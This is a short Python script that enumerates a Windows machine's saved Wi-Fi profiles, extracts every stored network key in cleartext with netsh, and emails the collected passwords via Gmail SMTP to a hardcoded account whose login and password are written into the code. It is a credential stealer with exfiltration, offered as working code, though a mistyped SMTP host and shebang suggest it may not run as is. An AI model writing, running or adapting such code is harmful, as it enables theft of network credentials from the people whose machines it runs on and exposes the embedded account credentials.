#!/usr/bin/evn python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smpt.gmail.com", 587)  # Google server that allow us to use and send email, and google use 587 port
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile "
networks = subprocess.check_output(command, shell=True)
network_name_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""

for network_name in network_name_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail('mrboothacker@gmail.com', '@Prince768@', result)
